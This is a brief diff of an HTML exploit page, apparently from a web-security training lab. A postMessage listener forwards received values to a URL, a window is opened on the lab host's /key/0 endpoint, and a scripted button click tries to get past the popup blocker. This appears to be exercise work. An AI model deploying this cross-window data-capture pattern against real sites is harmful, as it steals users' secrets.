@@ -5,9 +5,11 @@ window.addEventListener("message", function(event){
         + encodeURIComponent(event.data.value);
 }, false);
 
-window.open('https://ptl-1c918226d5ec-d294b17257b0.libcurl.so/key/0')
 // window.open("https://ptl-1c918226d5ec-d294b17257b0.libcurl.so/key/0");
 </script>
 
-  <button onclick="">go</button>
+<button id="b" onclick="window.open('https://ptl-1c918226d5ec-d294b17257b0.libcurl.so/key/0')">go</button>
+<script>
+  document.getElementById("b").click(); // blocked, same as auto window.open
+</script>
 </html>
